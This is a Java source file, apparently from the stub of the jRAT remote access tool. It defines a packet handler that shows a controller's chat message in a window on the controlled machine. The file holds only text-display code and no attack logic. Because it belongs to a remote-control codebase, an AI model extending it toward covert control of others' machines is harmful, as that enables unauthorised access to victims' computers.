package se.jrat.stub.packets.incoming;

import java.awt.Color;

import javax.swing.text.AttributeSet;
import javax.swing.text.SimpleAttributeSet;
import javax.swing.text.StyleConstants;
import javax.swing.text.StyleContext;

import se.jrat.stub.Connection;


public class Packet51ChatMessage extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		if (Connection.instance.getFrameChat() != null) {
			String message = Connection.instance.readLine();
			StyleContext sc = StyleContext.getDefaultStyleContext();
			AttributeSet set = sc.addAttribute(SimpleAttributeSet.EMPTY, StyleConstants.Foreground, Color.red);
			Connection.instance.getFrameChat().txtChat.getDocument().insertString(Connection.instance.getFrameChat().txtChat.getDocument().getLength(), "Controller: " + message + "\n", set);
			Connection.instance.getFrameChat().txtChat.setSelectionEnd(Connection.instance.getFrameChat().txtChat.getText().length());
			Connection.instance.getFrameChat().txtChat.setSelectionStart(Connection.instance.getFrameChat().txtChat.getText().length());
		}
	}

}
